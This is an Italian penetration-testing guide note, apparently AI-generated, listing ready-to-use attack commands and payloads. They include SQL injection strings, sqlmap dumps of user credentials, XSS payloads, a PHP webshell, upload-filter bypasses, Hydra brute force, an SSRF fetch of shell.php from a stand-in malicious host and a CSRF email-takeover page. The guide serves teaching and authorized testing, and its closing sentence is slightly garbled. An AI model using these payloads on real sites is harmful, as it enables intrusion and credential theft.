---
last modified: 2025-11-04T15:16:06.000Z
related: null
parent note: '[[Penetration testing]]'
tags:
  - penetration-testing
  - web-security
  - owasp-wstg
---

## Tecniche di Pen testing per sito web
Quando ti trovi di fronte a un sito web che sembra insicuro o abbandonato, puoi utilizzare diverse tecniche di penetration testing a scopo didattico per valutarne la sicurezza. Di seguito troverai una guida tecnica completa delle metodologie e degli strumenti disponibili, seguendo gli standard OWASP e le best practices del settore.

## Fasi del Penetration Testing Web

## 1. Reconnaissance e Information Gathering

La fase iniziale consiste nel raccogliere informazioni sul target senza necessariamente interagire direttamente con esso.[taapublications+1](https://taapublications.com/tijsrat/article/view/464)​

**Tecniche passive:**
- Analisi del **robots.txt** e **sitemap.xml**: questi file possono rivelare directory nascoste, percorsi amministrativi o aree sensibili che il proprietario intende nascondere ai motori di ricerca. Attenzione: il contenuto del robots.txt è pubblico e può essere letto da chiunque, quindi spesso espone informazioni preziose come `/admin/`, `/backup/`, o `/database/`.[redsecuretech+3](https://redsecuretech.co.uk/blog/post/the-dangers-of-misconfigured-robots-txt-and-how-to-secure-it/405)​
- Esame del **codice sorgente HTML**: cercare commenti, versioni di framework, path di file JavaScript/CSS che possono rivelare la tecnologia utilizzata.
- Raccolta di **metadata**: header HTTP, banner del server, versioni software esposte.[purplesec](https://purplesec.us/learn/web-application-penetration-testing/)​
    

**Strumenti per il fingerprinting:**

- **WhatWeb**: identifica tecnologie web, CMS, framework, server e plugin utilizzati[webasha+2](https://www.webasha.com/blog/tool-wars-comparing-nmap-nessus-and-nikto-recon-tools-for-ethical-hackers)​
    
- **Nikto**: scanner di vulnerabilità web che identifica configurazioni errate, versioni obsolete di software e oltre 6.700 file/programmi potenzialmente pericolosi[geeksforgeeks+2](https://www.geeksforgeeks.org/ethical-hacking/what-is-nikto-and-its-usages/)​
    
- **Nmap**: per la scansione delle porte aperte, identificazione dei servizi e del sistema operativo[webasha](https://www.webasha.com/blog/tool-wars-comparing-nmap-nessus-and-nikto-recon-tools-for-ethical-hackers)​
    

**Esempio di utilizzo:**


```bash
# Fingerprinting con WhatWeb 
whatweb https://target-site.com  
# Scansione di vulnerabilità con Nikto 
nikto -h https://target-site.com  
# Scansione porte con Nmap 
nmap -sV -sC target-site.com
```

## 2. Directory e File Enumeration

Questa tecnica permette di scoprire directory e file nascosti che non sono linkati dalla navigazione principale del sito.[ieeexplore.ieee+2](https://ieeexplore.ieee.org/document/10127486/)​

**Strumenti principali:**

- **Gobuster**: strumento veloce scritto in Go per il brute-forcing di directory, DNS e virtual host[abrictosecurity+3](https://abrictosecurity.com/gobuster-directory-enumerator-cheat-sheet/)​
    
- **Dirbuster**: alternativa con interfaccia grafica
    
- **FFUF**: fuzzer web estremamente veloce
    

**Esempio con Gobuster:**

bash

`# Enumerazione directory base gobuster dir -u https://target-site.com -w /usr/share/wordlists/dirb/common.txt # Ricerca di file specifici gobuster dir -u https://target-site.com -w wordlist.txt -x php,html,txt,js,zip,bak # Con autenticazione gobuster dir -u https://target-site.com -w wordlist.txt -c "session=cookie_value"`

Le wordlist possono essere trovate in **SecLists**, una collezione completa di wordlist per penetration testing.[hackertarget+1](https://hackertarget.com/gobuster-tutorial/)​

## 3. Vulnerability Scanning e Testing

**Framework OWASP**

Il penetration testing dovrebbe seguire la **OWASP Web Security Testing Guide (WSTG)**, che copre:[cobalt+3](https://docs.cobalt.io/methodologies/web-methodologies/)​

- **Information Gathering**: raccolta di informazioni sul server e l'applicazione[cyolo](https://cyolo.io/blog/the-owasp-web-security-testing-guide-how-to-get-started-and-improve-application-security)​
    
- **Configuration and Deployment Management**: test di configurazione di rete, applicazione e HTTP[cyolo](https://cyolo.io/blog/the-owasp-web-security-testing-guide-how-to-get-started-and-improve-application-security)​
    
- **Identity Management**: test di registrazione, provisioning e de-provisioning degli utenti[qualysec](https://qualysec.com/owasp-penetration-testing/)​
    
- **Authentication Testing**: verifica dei meccanismi di autenticazione[qualysec](https://qualysec.com/owasp-penetration-testing/)​
    
- **Authorization Testing**: test di bypass dell'autorizzazione e privilege escalation[qualysec](https://qualysec.com/owasp-penetration-testing/)​
    
- **Session Management**: analisi dei token di sessione e della loro gestione[qualysec](https://qualysec.com/owasp-penetration-testing/)​
    
- **Input Validation Testing**: SQL injection, XSS, command injection[qualysec](https://qualysec.com/owasp-penetration-testing/)​
    
- **Error Handling**: verifica che i messaggi di errore non espongano informazioni sensibili[qualysec](https://qualysec.com/owasp-penetration-testing/)​
    

**Strumenti di scanning automatizzato:**

- **OWASP ZAP (Zed Attack Proxy)**: scanner open-source per vulnerabilità web[ieeexplore.ieee+3](https://ieeexplore.ieee.org/document/10743903/)​
    
- **Burp Suite**: toolkit completo per web application security testing, disponibile in versione Community (gratuita) e Professional[snyk+2](https://snyk.io/blog/ethical-hacking-tools/)​
    
- **W3af**: framework per auditing e attacchi a web application[purplesec](https://purplesec.us/learn/web-application-penetration-testing/)​
    

## 4. SQL Injection Testing

L'SQL injection è una delle vulnerabilità più comuni e pericolose.[acm+2](https://dl.acm.org/doi/10.1145/2523514.2523589)​

**Tecniche di testing manuale:**

**Test base** - inserire caratteri speciali per provocare errori:[testrigor+1](https://testrigor.com/blog/how-to-test-for-sql-injections/)​

sql

`' " -- ; ' OR 1=1--`

**Boolean-based blind SQLi**:[brightsec+1](https://brightsec.com/blog/sql-injection-test/)​

sql

`' OR 1=1-- ' OR 1=2--`

**Time-based blind SQLi**:[testrigor+1](https://testrigor.com/blog/how-to-test-for-sql-injections/)​

sql

`' OR IF(1=1, SLEEP(5), 0)--`

**Union-based SQLi** per estrarre dati:[infosecwriteups+1](https://infosecwriteups.com/sql-injection-enumeration-without-knowing-table-or-db-names-5faae786c154)​

sql

`' UNION SELECT NULL, NULL-- ' UNION SELECT username, password FROM users--`

**Enumerazione database senza conoscere tabelle**:[infosecwriteups](https://infosecwriteups.com/sql-injection-enumeration-without-knowing-table-or-db-names-5faae786c154)​

sql

`# Scoprire database corrente ' UNION SELECT null, database(), null-- (MySQL) # Elencare tutti i database ' UNION SELECT schema_name, null FROM information_schema.schemata-- (MySQL) # Elencare tabelle ' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='database_name'-- # Elencare colonne ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--`

**SQLMap** - Automazione dell'exploitation:[vaadata+3](https://www.vaadata.com/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/)​

SQLmap è lo strumento più potente per rilevare ed exploitare SQL injection, supportando sei tecniche diverse: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries e out-of-band.[sqlmap](https://sqlmap.org/)​

bash

`# Test base per SQL injection sqlmap -u "http://target-site.com/page?id=1" # Enumerare i database sqlmap -u "http://target-site.com/page?id=1" --dbs # Enumerare tabelle di un database specifico sqlmap -u "http://target-site.com/page?id=1" -D database_name --tables # Enumerare colonne di una tabella sqlmap -u "http://target-site.com/page?id=1" -D database_name -T users --columns # Estrarre dati sqlmap -u "http://target-site.com/page?id=1" -D database_name -T users -C username,password --dump # Con Burp Suite (salvare la richiesta HTTP in un file) sqlmap -r request.txt --dbs`

## 5. Cross-Site Scripting (XSS) Testing

XSS permette di iniettare script maligni nelle pagine web visualizzate da altri utenti.[tencentcloud+3](https://www.tencentcloud.com/techpedia/106110)​

**Tipi di XSS:**

- **Reflected XSS**: lo script maligno proviene dalla richiesta HTTP corrente[portswigger](https://portswigger.net/web-security/cross-site-scripting)​
    
- **Stored XSS**: lo script è salvato nel database e mostrato permanentemente[portswigger](https://portswigger.net/web-security/cross-site-scripting)​
    
- **DOM-based XSS**: la vulnerabilità esiste nel codice client-side[portswigger](https://portswigger.net/web-security/cross-site-scripting)​
    

**Payload di test base**:[hackviser+1](https://hackviser.com/tactics/pentesting/web/xss)​

javascript

`<script>alert(1)</script> <img src=x onerror=alert(1)> "><script>alert(1)</script> </script><script>alert(1)</script> # Test in parametri URL site.com/page?search=<script>alert(1)</script> # Test in hash fragment (DOM XSS) site.com/page#<img src=x onerror=alert(1)>`

**Test nei vari contesti**:[hackviser](https://hackviser.com/tactics/pentesting/web/xss)​

javascript

`# Context HTML <div>INPUT</div> → <div><script>alert(1)</script></div> # Context JavaScript <script>var x = 'INPUT';</script> → <script>var x = '';alert(1)//'; </script> # Context attributo HTML <input value="INPUT"> → <input value="" onmouseover="alert(1)">`

**Strumenti automatizzati:**

- **XSStrike**: scanner automatico per XSS con crawling e test su parametri, headers e blind XSS[hackviser](https://hackviser.com/tactics/pentesting/web/xss)​
    

## 6. File Upload Vulnerabilities

Le vulnerabilità di file upload possono portare a **Remote Code Execution (RCE)**.[vaadata+2](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)​

**Tecniche di bypass:**

**Bypass dell'estensione file**:[vaadata](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)​

- Doppie estensioni: `image.jpg.php`
    
- Estensioni alternative: `.php5`, `.phtml`, `.phps`
    
- Case variation: `.PhP`, `.pHp`
    
- Caratteri speciali: `shell.php%00.jpg`, `shell.php;.jpg`
    
- Path traversal: `../../shell.php`
    

**Bypass della validazione del contenuto**:[vaadata](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)​

- **Magic bytes spoofing**: inserire i byte iniziali di un'immagine legittima (es. `FFD8` per JPEG) all'inizio di un file PHP
    
- **Polyglot files**: file che sono sia immagini valide che script eseguibili
    

**XSS tramite SVG upload**:[vaadata](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)​

xml

`<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg version="1.1" xmlns="http://www.w3.org/2000/svg">   <script type="text/javascript">     alert(document.cookie);   </script> </svg>`

**Webshell upload per RCE**:[vaadata](https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/)​

php

`<?php system($_GET['cmd']); ?>`

## 7. Authentication Bypass Testing

Le vulnerabilità di bypass dell'autenticazione permettono l'accesso non autorizzato senza credenziali valide.[legitsecurity+2](https://www.legitsecurity.com/aspm-knowledge-base/authentication-bypass-vulnerability)​

**Tecniche comuni:**

**Direct page access** - accedere direttamente a pagine interne senza login:[owasp](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema)​

text

`https://target-site.com/admin/dashboard https://target-site.com/user/profile?id=1`

**Parameter manipulation**:[owasp](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema)​

text

`# Modificare parametri URL ?admin=true ?role=administrator ?authenticated=1 # SQL injection nel login username: admin' OR '1'='1'-- password: qualsiasi`

**Session manipulation**:

- Modificare cookie di sessione
    
- Session fixation
    
- Session token prediction
    

**Brute force attacks**:[legitsecurity](https://www.legitsecurity.com/aspm-knowledge-base/authentication-bypass-vulnerability)​

bash

`# Con Hydra hydra -l admin -P passwords.txt target-site.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"`

## 8. Server-Side Request Forgery (SSRF)

SSRF permette a un attaccante di far eseguire richieste al server verso risorse interne o esterne.[owasp+2](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)​

**Test per SSRF**:[owasp](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)​

text

`# Accesso a risorse interne GET https://example.com/page?url=http://localhost/admin GET https://example.com/page?url=http://127.0.0.1/admin GET https://example.com/page?url=http://192.168.1.1 # Caricamento file maligno GET https://example.com/page?url=https://malicious-site.com/shell.php # Accesso a metadata cloud (AWS) GET https://example.com/page?url=http://169.254.169.254/latest/meta-data/`

## 9. Cross-Site Request Forgery (CSRF)

CSRF forza un utente autenticato a eseguire azioni indesiderate.[intigriti](https://www.intigriti.com/researchers/blog/hacking-tools/csrf-a-complete-guide-to-exploiting-advanced-csrf-vulnerabilities)​

**Condizioni per vulnerabilità CSRF**:[intigriti](https://www.intigriti.com/researchers/blog/hacking-tools/csrf-a-complete-guide-to-exploiting-advanced-csrf-vulnerabilities)​

1. La funzionalità deve essere privilegiata (cambio password, trasferimento fondi, ecc.)
    
2. Il cookie di sessione deve avere policy SameSite impostata su "None" o "Lax"
    
3. La richiesta HTTP non deve contenere token anti-CSRF imprevedibili
    

**Proof of Concept**:[intigriti](https://www.intigriti.com/researchers/blog/hacking-tools/csrf-a-complete-guide-to-exploiting-advanced-csrf-vulnerabilities)​

xml

`<html>   <body>     <form action="https://target-site.com/change-email" method="POST">       <input type="hidden" name="email" value="attacker@evil.com" />     </form>     <script>       document.forms[0].submit();     </script>   </body> </html>`

## Strumenti Integrati e Suite Complete

**Burp Suite** è uno degli strumenti più completi:[snyk+1](https://snyk.io/blog/ethical-hacking-tools/)​

- **Proxy**: intercetta e modifica richieste/risposte HTTP
    
- **Spider**: mappa automaticamente l'applicazione
    
- **Scanner**: identifica vulnerabilità (solo versione Professional)
    
- **Intruder**: automazione di attacchi personalizzati
    
- **Repeater**: modifica e reinvia richieste manualmente
    
- **Decoder/Comparer**: utility per encoding/decoding e confronto
    

**Metasploit Framework**:[invensislearning+2](https://www.invensislearning.com/blog/top-ethical-hacking-tools/)​

- Framework completo per exploitation
    
- Database di exploit per vulnerabilità note
    
- Moduli post-exploitation
    

**Kali Linux**:[snyk](https://snyk.io/blog/ethical-hacking-tools/)​  
Sistema operativo completo con oltre 600 strumenti di penetration testing pre-installati.

## Considerazioni Etiche e Legali

**Aspetti critici da ricordare**:

1. **Autorizzazione**: Non testare mai un sito web senza esplicita autorizzazione scritta del proprietario. Farlo senza permesso è illegale e può portare a conseguenze penali.
    
2. **Scope limitato**: Anche con autorizzazione, rispetta sempre i limiti concordati (IP, domini, orari, tecniche permesse).
    
3. **Ambiente di test**: Per scopi didattici, utilizza ambienti vulnerabili appositamente creati come:
    
    - **DVWA** (Damn Vulnerable Web Application)
        
    - **WebGoat** (OWASP)
        
    - **bWAPP** (buggy Web Application)
        
    - **OWASP Juice Shop**
        
    - Piattaforme come HackTheBox, TryHackMe, PentesterLab
        
4. **Documentazione**: Documenta sempre ogni passo del test, i risultati trovati e fornisci raccomandazioni per la remediation.
    
5. **Responsible Disclosure**: Se trovi vulnerabilità reali, segui le politiche di responsible disclosure per segnalarle al proprietario prima di renderle pubbliche.
    

## Best Practices per l'Apprendimento

Dato il tuo background tecnico in programmazione Java e metodologie Agile, puoi approfondire il penetration testing in modo strutturato:[techscience+3](https://www.techscience.com/cmc/v82n3/59905)​

1. Inizia con la **OWASP Testing Guide** completa[owasp+2](https://owasp.org/www-project-web-security-testing-guide/)​
    
2. Pratica in ambienti controllati come DVWA o WebGoat
    
3. Segui certificazioni come **CEH** (Certified Ethical Hacker) o **OSCP** (Offensive Security Certified Professional)
    
4. Combina la conoscenza dello sviluppo con quella della sicurezza per comprendere meglio le vulnerabilità dal punto di vista del codice
    
5. Utilizza metodologie sistematiche come quella OWASP che già conosci dal mondo dello sviluppo
    

Ricorda che il penetration testing richiede una combinazione di conoscenze tecniche, creatività nel trovare bypass e un approccio metodico e documentato - competenze che già possiedi dal tuo background in programmazione e metodologie strutrammazione e metodologie strutturate.---
last modified: 
tags: 
related: 
parent note:
---
